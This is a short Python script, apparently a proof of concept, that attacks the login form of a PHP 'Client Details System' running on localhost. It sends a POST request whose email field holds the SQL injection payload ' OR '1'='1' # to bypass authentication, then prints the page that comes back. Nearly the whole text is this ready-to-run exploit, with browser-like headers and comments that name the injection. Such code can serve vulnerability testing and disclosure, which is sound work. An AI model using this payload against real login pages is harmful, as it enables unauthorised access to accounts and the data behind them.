

import requests # Imports the requests module to send HTTP requests

#Define HTTP headers for the request
headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://localhost',
    'Referer': 'http://localhost/Client_DetailsSystem%20PHP/clientdetails/index.php', #link of the web
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
    'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    # 'Cookie': 'PHPSESSID=3nfq5ihq7fnumknchhh5gs3bko',
}

data = {
    'uemail': "' OR '1'='1' #", # SQL injection 
    'password': 'asdfghj', #Random password
    'login': 'LOG IN', #Login button Action
}

response = requests.post(
    'http://localhost/Client_DetailsSystem%20PHP/clientdetails/index.php',
    headers=headers,
    data=data,
)

print(response.text)
#prints HTML content of the response